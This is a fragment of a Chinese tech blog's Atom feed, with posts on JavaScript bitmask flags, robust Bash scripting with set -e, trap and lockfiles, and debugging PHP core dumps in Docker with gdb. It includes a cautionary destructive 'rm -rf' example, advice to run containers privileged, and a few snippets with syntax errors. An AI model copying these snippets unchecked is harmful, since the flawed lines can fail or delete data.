&lt;p&gt;前面我们已经了解了六大位操作符（&lt;code&gt;&amp;amp;&lt;/code&gt; &lt;code&gt;|&lt;/code&gt; &lt;code&gt;~&lt;/code&gt; &lt;code&gt;^&lt;/code&gt; &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt; &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;)的用法（&lt;a href=&quot;http://www.cnblogs.com/zichi/p/4787145.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;javascript 位运算&lt;/a&gt;），也整理了一些常用的位运算操作（&lt;a href=&quot;http://www.cnblogs.com/zichi/p/4789439.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;常用位运算整理&lt;/a&gt;），本文我们继续深入位运算，来了解下二进制的经典应用-标志位与掩码。&lt;/p&gt;
&lt;p&gt;位运算经常被用来创建、处理以及读取标志位序列——一种类似二进制的变量。虽然可以使用变量代替标志位序列，但是这样可以节省内存（1/32）。&lt;/p&gt;
&lt;p&gt;例如有4个标志位：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;标志位A： 我们有 Apple&lt;/li&gt;
&lt;li&gt;标志位B： 我们有 Banana&lt;/li&gt;
&lt;li&gt;标志位C： 我们有 Cherry&lt;/li&gt;
&lt;li&gt;标志位D： 我们有 Dew&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;标志位通过位序列DCBA来表示，当一个位置被置为1时，表示有该项，置为0时，表示没有该项。例如一个变量flag=9，二进制表示为1001，就表示我们有D和A。&lt;/p&gt;
&lt;p&gt;掩码 (bitmask) 是一个通过与/或来读取标志位的位序列。典型的定义每个标志位的原语掩码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; FLAG_A = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 0001&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; FLAG_B = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 0010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; FLAG_C = &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 0100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; FLAG_D = &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// 1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="mask" scheme="http://www.twosee.cn/tags/mask/"/>
    
  </entry>
  
  <entry>
    <title>[整理] 写出健壮的Shell脚本及Shell异常处理</title>
    <link href="http://www.twosee.cn/2018/03/18/stronger-shell/"/>
    <id>http://www.twosee.cn/2018/03/18/stronger-shell/</id>
    <published>2018-03-18T08:58:16.000Z</published>
    <updated>2018-04-05T08:45:31.256Z</updated>
    
    <content type="html"><![CDATA[<p>许多人用shell脚本完成一些简单任务，而且变成了他们生命的一部分。不幸的是，shell脚本在运行异常时会受到非常大的影响。在写脚本时将这类问题最小化是十分必要的。本文中我将介绍一些让bash脚本变得健壮的技术。</p><h1 id="使用set-u"><a href="#使用set-u" class="headerlink" title="使用set -u"></a>使用set -u</h1><p>你因为没有对变量初始化而使脚本崩溃过多少次？对于我来说，很多次。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chroot=$1</span><br><span class="line">...</span><br><span class="line">rm -rf $chroot/usr/share/doc</span><br></pre></td></tr></table></figure><p>如果上面的代码你没有给参数就运行，你不会仅仅删除掉chroot中的文档，而是将系统的所有文档都删除。那你应该做些什么呢？好在bash提供了<em>set -u</em>，当你使用未初始化的变量时，让bash自动退出。你也可以使用可读性更强一点的<code>set -o nounset</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">david%</span><span class="bash"> bash /tmp/shrink-chroot.sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">chroot=</span></span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"> bash -u /tmp/shrink-chroot.sh</span></span><br><span class="line"></span><br><span class="line">/tmp/shrink-chroot.sh: line 3: $1: unbound variable</span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"></span></span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="使用set-e"><a href="#使用set-e" class="headerlink" title="使用set -e"></a>使用set -e</h1><p>你写的每一个脚本的开始都应该包含<em>set -e</em>。这告诉bash一但有任何一个语句返回非真的值，则退出bash。使用-e的好处是避免错误滚雪球般的变成严重错误，能尽早的捕获错误。更加可读的版本：<code>set -o errexit</code></p><p>使用-e把你从检查错误中解放出来。如果你忘记了检查，bash会替你做这件事。不过你也没有办法使用<em>$?</em>来获取命令执行状态了，因为bash无法获得任何非0的返回值。你可以使用另一种结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command</span><br><span class="line"></span><br><span class="line">if [ "$?"-ne 0]; then echo "command failed"; exit 1; fi</span><br></pre></td></tr></table></figure><p>可以替换成：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">command || &#123; echo "command failed"; exit 1; &#125;</span><br></pre></td></tr></table></figure></p><p>或者使用：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if ! command; then echo "command failed"; exit 1; fi</span><br></pre></td></tr></table></figure></p><p>如果你必须使用返回非0值的命令，或者你对返回值并不感兴趣呢？你可以使用 <code>command || true</code> ，或者你有一段很长的代码，你可以暂时关闭错误检查功能，不过我建议你谨慎使用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set +e</span><br><span class="line"></span><br><span class="line">command1</span><br><span class="line"></span><br><span class="line">command2</span><br><span class="line"></span><br><span class="line">set -e</span><br></pre></td></tr></table></figure><p>相关文档指出，bash默认返回管道中最后一个命令的值，也许是你不想要的那个。比如执行 <code>false | true</code> 将会被认为命令成功执行。如果你想让这样的命令被认为是执行失败，可以使用 <code>set -o pipefail</code></p><h1 id="程序防御-考虑意料之外的事"><a href="#程序防御-考虑意料之外的事" class="headerlink" title="程序防御 - 考虑意料之外的事"></a>程序防御 - 考虑意料之外的事</h1><p>你的脚本也许会被放到“意外”的账户下运行，像缺少文件或者目录没有被创建等情况。你可以做一些预防这些错误事情。比如，当你创建一个目录后，如果父目录不存在，<strong><code>mkdir</code></strong> 命令会返回一个错误。如果你创建目录时给<strong><code>mkdir</code></strong>命令加上-p选项，它会在创建需要的目录前，把需要的父目录创建出来。另一个例子是 <strong><code>rm</code></strong> 命令。如果你要删除一个不存在的文件，它会“吐槽”并且你的脚本会停止工作。（因为你使用了-e选项，对吧？）你可以使用-f选项来解决这个问题，在文件不存在的时候让脚本继续工作。 </p><h1 id="准备好处理文件名中的空格"><a href="#准备好处理文件名中的空格" class="headerlink" title="准备好处理文件名中的空格"></a>准备好处理文件名中的空格</h1><p>有些人从在文件名或者命令行参数中使用空格，你需要在编写脚本时时刻记得这件事。你需要时刻记得用引号包围变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if [ $filename = "foo" ];</span><br><span class="line"></span><br><span class="line">当*$filename*变量包含空格时就会挂掉。可以这样解决：</span><br><span class="line"></span><br><span class="line">if [ "$filename" = "foo" ];</span><br></pre></td></tr></table></figure><p>使用<code>$@</code>变量时，你也需要使用引号，因为空格隔开的两个参数会被解释成两个独立的部分。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">david%</span><span class="bash"> <span class="function"><span class="title">foo</span></span>() &#123; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span> &#125;; foo bar <span class="string">"baz quux"</span></span></span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line"></span><br><span class="line">baz</span><br><span class="line"></span><br><span class="line">quux</span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"> <span class="function"><span class="title">foo</span></span>() &#123; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span>; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span> &#125;; foo bar <span class="string">"baz quux"</span></span></span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line"></span><br><span class="line">baz quux</span><br></pre></td></tr></table></figure><p>我没有想到任何不能使用<em>“$@”</em>的时候，所以当你有疑问的时候，使用引号就没有错误。</p><p>如果你同时使用find和xargs，你应该使用 -print0 来让字符分割文件名，而不是换行符分割。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">david%</span><span class="bash"> touch <span class="string">"foo bar"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"> find | xargs ls</span></span><br><span class="line"></span><br><span class="line">ls: ./foo: No such file or directory</span><br><span class="line"></span><br><span class="line">ls: bar: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="meta">david%</span><span class="bash"> find -print0 | xargs -0 ls</span></span><br><span class="line"></span><br><span class="line">./foo bar</span><br></pre></td></tr></table></figure><h1 id="设置的陷阱"><a href="#设置的陷阱" class="headerlink" title="设置的陷阱"></a>设置的陷阱</h1><p>当你编写的脚本挂掉后，文件系统处于未知状态。比如锁文件状态、临时文件状态或者更新了一个文件后在更新下一个文件前挂掉。如果你能解决这些问题，无论是 删除锁文件，又或者在脚本遇到问题时回滚到已知状态，你都是非常棒的。幸运的是，bash提供了一种方法，当bash接收到一个UNIX信号时，运行一个 命令或者一个函数。可以使用<strong>trap</strong>命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">trap</span> <span class="built_in">command</span> signal [signal …]</span><br></pre></td></tr></table></figure><p>你可以链接多个信号（列表可以使用kill -l获得），但是为了清理残局，我们只使用其中的三个：<em>INT</em>，<em>TERM</em>和<em>EXIT</em>。你可以使用-as来让traps恢复到初始状态。</p><h4 id="信号描述"><a href="#信号描述" class="headerlink" title="信号描述"></a>信号描述</h4><table><thead><tr><th>INT</th><th>Interrupt - 当有人使用Ctrl-C终止脚本时被触发</th></tr></thead><tbody><tr><td>TERM</td><td>Terminate - 当有人使用kill杀死脚本进程时被触发</td></tr><tr><td>EXIT</td><td>Exit - 这是一个伪信号，当脚本正常退出或者set -e后因为出错而退出时被触发</td></tr></tbody></table><p>当你使用锁文件时，可以这样写：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if [ ! -e $lockfile ]; then</span><br><span class="line"></span><br><span class="line">touch $lockfile</span><br><span class="line"></span><br><span class="line">critical-section</span><br><span class="line"></span><br><span class="line">rm $lockfile</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">echo "critical-section is already running"</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>当最重要的部分(critical-section)正在运行时，如果杀死了脚本进程，会发生什么呢？锁文件会被扔在那，而且你的脚本在它被删除以前再也不会运行了。解决方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if [ ! -e $lockfile ]; then</span><br><span class="line"></span><br><span class="line">trap " rm -f $lockfile; exit" INT TERM EXIT</span><br><span class="line"></span><br><span class="line">touch $lockfile</span><br><span class="line"></span><br><span class="line">critical-section</span><br><span class="line"></span><br><span class="line">rm $lockfile</span><br><span class="line"></span><br><span class="line">trap - INT TERM EXIT</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">echo "critical-section is already running"</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>现在当你杀死进程时，锁文件一同被删除。注意在trap命令中明确地退出了脚本，否则脚本会继续执行trap后面的命令。</p><h1 id="竟态条件-wikipedia"><a href="#竟态条件-wikipedia" class="headerlink" title="竟态条件 (wikipedia)"></a>竟态条件 (<a href="http://zh.wikipedia.org/wiki/%E7%AB%B6%E7%88%AD%E5%8D%B1%E5%AE%B3" target="_blank" rel="noopener">wikipedia</a>)</h1><p>在上面锁文件的例子中，有一个竟态条件是不得不指出的，它存在于判断锁文件和创建锁文件之间。一个可行的解决方法是使用IO重定向和bash的noclobber(<a href="http://en.wikipedia.org/wiki/Clobbering" target="_blank" rel="noopener">wikipedia</a>)模式，重定向到不存在的文件。我们可以这么做：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if ( set -o noclobber; echo "$$" &gt; "$lockfile") 2&gt; /dev/null;</span><br><span class="line"></span><br><span class="line">then</span><br><span class="line"></span><br><span class="line">trap 'rm -f "$lockfile"; exit $?' INT TERM EXIT</span><br><span class="line"></span><br><span class="line">critical-section</span><br><span class="line"></span><br><span class="line">rm -f "$lockfile"</span><br><span class="line"></span><br><span class="line">trap - INT TERM EXIT</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">echo "Failed to acquire lockfile: $lockfile"</span><br><span class="line"></span><br><span class="line">echo "held by $(cat $lockfile)"</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>更复杂一点儿的问题是你要更新一大堆文件，当它们更新过程中出现问题时，你是否能让脚本挂得更加优雅一些。你想确认那些正确更新了，哪些根本没有变化。比如你需要一个添加用户的脚本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add_to_passwd $user</span><br><span class="line"></span><br><span class="line">cp -a /etc/skel /home/$user</span><br><span class="line"></span><br><span class="line">chown $user /home/$user -R</span><br></pre></td></tr></table></figure><p>当磁盘空间不足或者进程中途被杀死，这个脚本就会出现问题。在这种情况下，你也许希望用户账户不存在，而且他的文件也应该被删除。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">rollback() &#123;</span><br><span class="line"></span><br><span class="line">del_from_passwd $user</span><br><span class="line"></span><br><span class="line">if [ -e /home/$user ]; then</span><br><span class="line"></span><br><span class="line">rm -rf /home/$user</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">trap rollback INT TERM EXIT</span><br><span class="line"></span><br><span class="line">add_to_passwd $user</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">cp -a /etc/skel /home/$user</span><br><span class="line"></span><br><span class="line">chown $user /home/$user -R</span><br><span class="line"></span><br><span class="line">trap - INT TERM EXIT</span><br></pre></td></tr></table></figure><p>在脚本最后需要使用trap关闭rollback调用，否则当脚本正常退出的时候rollback将会被调用，那么脚本等于什么都没做。</p><h1 id="保持原子化"><a href="#保持原子化" class="headerlink" title="保持原子化"></a>保持原子化</h1><p>又是你需要一次更新目录中的一大堆文件，比如你需要将URL重写到另一个网站的域名。你也许会写：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for file in $(find /var/www -type f -name "*.html"); do</span><br><span class="line"></span><br><span class="line">perl -pi -e 's/www.example.net/www.example.com/' $file</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>如果修改到一半是脚本出现问题，一部分使用www.example.com，而另一部分使用www.example.net。你可以使用备份和trap解决，但在升级过程中你的网站URL是不一致的。</p><p>解决方法是将这个改变做成一个原子操作。先对数据做一个副本，在副本中更新URL，再用副本替换掉现在工作的版本。你需要确认副本和工作版本目录在同一个磁盘分区上，这样你就可以利用Linux系统的优势，它移动目录仅仅是更新目录指向的inode节点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cp -a /var/www /var/www-tmp</span><br><span class="line"></span><br><span class="line">for file in $(find /var/www-tmp -type -f -name "*.html"); do</span><br><span class="line"></span><br><span class="line">perl -pi -e 's/www.example.net/www.example.com/' $file</span><br><span class="line"></span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">mv /var/www /var/www-old</span><br><span class="line"></span><br><span class="line">mv /var/www-tmp /var/www</span><br></pre></td></tr></table></figure><p>这意味着如果更新过程出问题，线上系统不会受影响。线上系统受影响的时间降低为两次mv操作的时间，这个时间非常短，因为文件系统仅更新inode而不用真正的复制所有的数据。</p><p>这种技术的缺点是你需要两倍的磁盘空间，而且那些长时间打开文件的进程需要比较长的时间才能升级到新文件版本，建议更新完成后重新启动这些进程。对于 apache服务器来说这不是问题，因为它每次都重新打开文件。你可以使用lsof命令查看当前正打开的文件。优势是你有了一个先前的备份，当你需要还原 时，它就派上用场了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;许多人用shell脚本完成一些简单任务，而且变成了他们生命的一部分。不幸的是，shell脚本在运行异常时会受到非常大的影响。在写脚本时将这类问题最小化是十分必要的。本文中我将介绍一些让bash脚本变得健壮的技术。&lt;/p&gt;
&lt;h1 id=&quot;使用set-u&quot;&gt;&lt;a href=&quot;#使用set-u&quot; class=&quot;headerlink&quot; title=&quot;使用set -u&quot;&gt;&lt;/a&gt;使用set -u&lt;/h1&gt;&lt;p&gt;你因为没有对变量初始化而使脚本崩溃过多少次？对于我来说，很多次。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chroot=$1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rm -rf $chroot/usr/share/doc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果上面的代码你没有给参数就运行，你不会仅仅删除掉chroot中的文档，而是将系统的所有文档都删除。那你应该做些什么呢？好在bash提供了&lt;em&gt;set -u&lt;/em&gt;，当你使用未初始化的变量时，让bash自动退出。你也可以使用可读性更强一点的&lt;code&gt;set -o nounset&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;david%&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; bash /tmp/shrink-chroot.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt;chroot=&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;david%&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; bash -u /tmp/shrink-chroot.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/tmp/shrink-chroot.sh: line 3: $1: unbound variable&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;david%&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="shell" scheme="http://www.twosee.cn/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>在Docker中处理coredump &amp;&amp; PHP-coredump与gdb使用</title>
    <link href="http://www.twosee.cn/2018/03/04/php-coredump-in-docker/"/>
    <id>http://www.twosee.cn/2018/03/04/php-coredump-in-docker/</id>
    <published>2018-03-04T13:03:01.000Z</published>
    <updated>2018-03-05T07:13:05.736Z</updated>
    
    <content type="html"><![CDATA[<p>前几天在计划写一个爬虫脚本时, 由于涉及到html的浏览器渲染, 干脆用就用浏览器和控制台运行js脚本来作为爬虫工具, chrome支持ES6语法(有些需要在dev设置中开启), 写起来也是十分舒服, 爬完数据并处理过后通过xhr扔给后端服务器即可, 后端是用Swoole负责接收并向数据库进行大文本插入, 不幸的是在这时候错误出现了.</p><p>在数千个请求后nginx代理的后端挂掉了,返回了502BadGateWay,肯定要去上游找原因了,由于swoole是跑在docker容器中的, 于是马上查看容器日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs custed_swoole_1 --tail 100</span><br></pre></td></tr></table></figure><p>可以看到如下报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ WARNINGswProcessPool_wait: worker<span class="comment">#0 abnormal exit, status=0, signal=11</span></span><br></pre></td></tr></table></figure><p>google了一下没找到相关问题, 只能请教rango, 说是signal11是coredump了, 让我抓一下core文件</p><p>然后就开始踩坑了, 我的服务是运行在docker中的, docker里要抓core文件需要一波操作了…</p><p>废话不多说直接总结一下坑</p><h4 id="1-开启容器特权"><a href="#1-开启容器特权" class="headerlink" title="1. 开启容器特权"></a>1. 开启容器特权</h4><p>没有特权模式, 容器里就无法使用gdb调试</p><p>我用的是docker-compose 所以配置里需要加这么一行</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如果是run的话, 加:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--privileged</span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="2-开启coredump文件配置"><a href="#2-开启coredump文件配置" class="headerlink" title="2.开启coredump文件配置"></a>2.开启coredump文件配置</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ulimits:</span></span><br><span class="line"><span class="attr">      core:</span> <span class="bullet">-1</span> <span class="comment"># core_dump debug</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span class="built_in">ulimit</span> core=-1</span><br></pre></td></tr></table></figure><h4 id="3-在容器里安装GDB"><a href="#3-在容器里安装GDB" class="headerlink" title="3. 在容器里安装GDB"></a>3. 在容器里安装GDB</h4><p>重新做镜像是不可能的了, 临时装一个吧(ps: 如果你不想在配置文件里开启core可以在这里临时设置)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line">apt-get install -y gdb</span><br></pre></td></tr></table></figure><h4 id="4-触发coredump测试"><a href="#4-触发coredump测试" class="headerlink" title="4. 触发coredump测试"></a>4. 触发coredump测试</h4><p>我们可以用一段c代码死循环来尝试触发一个coredump</p><p>使用<code>g++ -g</code>编译, 加-g选项是为了保证debug信息生成在应用程序当中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span 